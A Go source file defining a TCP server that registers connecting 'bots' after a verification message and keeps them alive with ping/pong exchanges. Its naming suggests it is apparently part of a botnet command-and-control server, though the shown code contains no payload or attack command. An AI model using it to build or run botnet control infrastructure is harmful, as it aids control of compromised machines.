package main

import (
	"net"
	"strings"
	"time"
)

type Bot struct {
	BotID      int
	Connection net.Conn
}

func NewBot(connection net.Conn) *Bot {
	return &Bot{
		BotID:      -1,
		Connection: connection,
	}
}

func (bot *Bot) Send(data string) {
	dataBytes := []byte(data)
	bot.Connection.Write(dataBytes)
}

func (bot *Bot) Recv(size int) (string, error) {
	buffer := make([]byte, size)
	if _, err := bot.Connection.Read(buffer); err != nil {
		return "", err
	}
	var data string = string(buffer)
	data = strings.Replace(data, "\x00", "", -1)
	data = strings.TrimSpace(data)
	return data, nil
}

func (bot *Bot) Handle() {
	defer bot.Connection.Close()
	defer botList.DeleteBot(bot)
	verifyMessage, err := bot.Recv(1024)
	if err != nil {
		return
	}
	if verifyMessage != VERIFY_MESSAGE {
		return
	}
	botList.AddBot(bot)
	for {
		bot.Send(PING_MESSAGE)
		pongMessage, err := bot.Recv(1024)
		if err != nil {
			break
		}
		if pongMessage != PONG_MESSAGE {
			break
		}
		time.Sleep(time.Duration(PING_DELAY) * time.Second)
	}
}

func BotServer() {
	botListener, err := net.Listen("tcp", SERVER_BOT_ADDRESS)
	if err != nil {
		if DEBUG_MODE {
			panic(err)
		}
		return
	}
	for {
		connection, err := botListener.Accept()
		if err != nil {
			if DEBUG_MODE {
				panic(err)
			}
			return
		}
		botServer := NewBot(connection)
		go botServer.Handle()
	}
}
